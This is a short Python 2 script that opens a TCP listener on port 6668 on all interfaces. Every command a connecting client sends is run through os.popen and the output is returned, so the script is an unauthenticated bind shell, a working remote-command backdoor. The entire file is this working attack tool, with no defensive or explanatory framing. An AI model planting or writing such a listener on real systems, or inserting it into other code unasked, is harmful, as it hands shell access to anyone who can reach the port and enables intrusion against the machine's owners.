# -*- coding: UTF-8 -*-
#author:wsg00d

from threading import Thread
from socket import *
from time import ctime
import os

s = socket(AF_INET, SOCK_STREAM)
s.bind(('0.0.0.0', 6668))
s.listen(5)

def threadhandle(sock):
    while 1:
        cmd = sock.recv(1024)
        print cmd
        if cmd == 'exit':
            exit()
        result = os.popen(cmd).read()
        if result:
            sock.send(result)
        else:
            sock.send('command error')

while 1:
    sock, addr = s.accept()
    print 'Connected by ', addr
    t=Thread(target=threadhandle,args=(sock,))
    t.start()


s.close()
